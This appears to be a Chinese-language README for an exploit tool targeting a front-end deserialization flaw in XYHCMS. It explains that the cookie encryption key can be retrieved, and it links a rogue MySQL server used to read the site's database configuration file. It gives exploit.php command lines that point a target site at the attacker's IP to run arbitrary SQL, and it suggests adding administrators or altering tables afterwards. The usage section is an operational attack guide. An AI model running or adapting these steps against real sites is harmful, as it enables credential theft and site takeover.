## XYHCMS 前台反序列化

反序列化链是用米斯特安全团队奶权师傅发现的 具体参见这篇文章：

https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA

漏洞利用限制： php5.x  貌似7.0有些版本是可以用的

这个漏洞思路也比较简单 Cookie是经过序列化后加密生成的 而这个加密的key又可以直接访问获取到 造成了前台反序列化可达到l执行任意sql的效果

漏洞细节参考这位师傅的文章：https://www.anquanke.com/post/id/232823

新版本已经修复该漏洞 将路径变成随机的了

## 使用

需要首先搭建一个恶意 mysql 服务器 这里推荐使用这位大师傅的：https://github.com/rmb122/rogue_mysql_server

编译版本：https://github.com/M00nBack/rogue_mysql_server

通过报错或者猜测获取网站根路径 修改配置文件config.yaml 读取数据库配置文件

![image-20210108222745982](img/image-20210108222745982.png))

使用exp:

```
php exploit.php http://127.0.0.1 yourip 3306 root root ""
```

服务端成功读取数据库配置文件之后 就可以任意sql执行了

```
php exploit.php http://127.0.0.1 127.0.0.1 3306 root root "select sleep(3)"
```

可以通过增加管理员或者修改数据表信息进一步利用